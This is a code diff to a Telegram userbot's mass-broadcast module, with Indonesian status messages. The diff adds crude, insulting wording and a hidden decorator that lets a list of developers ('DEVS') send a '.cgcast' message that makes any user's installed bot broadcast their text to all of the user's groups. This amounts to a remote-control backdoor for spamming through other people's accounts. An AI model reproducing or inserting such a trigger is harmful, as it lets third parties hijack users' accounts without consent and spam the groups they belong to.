@@ -28,10 +28,13 @@ GCAST_BLACKLIST = [
     -1001109837870,  # TelegramBotIndonesia
     -1001752592753,  # Skyzusupport
     -1001380293847,  # NastySupport
+    -1001664518224,  # JoniSupport
+    -1001606097524,  # SanjoSupport
 ]
 
 
 @skyzu_cmd(pattern="gcast(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -41,7 +44,7 @@ async def gcast(event):
     else:
         await event.edit("**Berikan Sebuah Pesan atau Reply**")
         return
-    kk = await event.edit("`Globally Broadcasting Msg...`")
+    kk = await event.edit("`Sedang Mengirim Ke Semua Grup Ampas...`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -56,7 +59,7 @@ async def gcast(event):
             except BaseException:
                 er += 1
     await kk.edit(
-        f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup, Gagal Mengirim Pesan Ke** `{er}` **Grup**"
+        f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup Ampas, Gagal Mengirim Pesan Ke** `{er}` **Grup Bokep**"
     )
 
 
@@ -70,7 +73,7 @@ async def gucast(event):
     else:
         await event.edit("**Berikan Sebuah Pesan atau Reply**")
         return
-    kk = await event.edit("`Globally Broadcasting Msg...`")
+    kk = await event.edit("`Sedang Mengirim Ke Private Chat Tuan...`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -82,7 +85,7 @@ async def gucast(event):
             except BaseException:
                 er += 1
     await kk.edit(
-        f"**Berhasil Mengirim Pesan Ke** `{done}` **chats, Gagal Mengirim Pesan Ke** `{er}` **chats**"
+        f"**Berhasil Mengirim Pesan Ke** `{done}` **Chat, Gagal Mengirim Pesan Ke** `{er}` **Chat**"
     )
 
 
